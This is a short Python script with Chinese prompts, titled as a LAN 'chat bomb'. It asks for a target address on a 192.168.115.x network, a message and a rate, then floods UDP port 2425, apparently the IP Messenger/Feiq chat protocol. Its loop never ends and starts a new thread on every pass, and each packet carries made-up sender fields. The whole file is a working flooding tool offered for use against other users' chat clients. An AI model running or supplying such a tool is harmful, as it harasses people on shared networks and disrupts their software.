# Small-Test-LAN-Chat-Bombs

import socket
import time
import threading
# broadcast_ip = "xxx.xxx.xxx.xxx"  #ip 地址
broadcast_ip = input("请输入ip的后两位或者三位：")
broadcast_ip = "192.168.115." + broadcast_ip
# 1. 创建套接字
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
send_data = input("请输入要发送的数据：")
times = int(input("请输入每秒发送次数："))
# time.sleep(1/times)

while True:
    def thread():
        time.sleep(1 / times)
        # send_data = input("请输入要发送的数据：")

        # 3. 发送数据
        msg = "1:%d:6楼:607:32:" % int(time.time()) + send_data
        udp_socket.sendto(msg.encode("gbk"), (broadcast_ip, 2425))
    pp = threading.Thread(target=thread)
    pp.start()

# 6. 关闭套接字
# udp_socket.close()
